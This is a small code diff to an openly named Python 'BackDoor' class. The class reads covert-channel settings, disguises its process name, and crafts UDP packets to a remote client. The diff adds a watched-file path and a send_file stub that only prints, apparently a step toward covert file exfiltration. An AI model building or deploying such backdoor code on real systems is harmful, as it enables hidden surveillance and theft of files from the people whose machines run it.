@@ -140,6 +140,7 @@ class BackDoor:
         self.proto = ""
         self.watch_dir = ""
         self.watch_file = ""
+        self.path = ""
         self.watch_status = False
 
 
@@ -195,6 +196,7 @@ class BackDoor:
         self.send_port = config['covert']['send_port']
         self.proto = config['share']['proto']
         self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
+        self.path = config['covert']['watch']
         self.client = config['covert']['client']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
@@ -217,7 +219,8 @@ class BackDoor:
         directory = path[:index]
         return directory, file
 
-
+    def send_file(self):
+        print(f"sending {self.path}")
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.send_port)
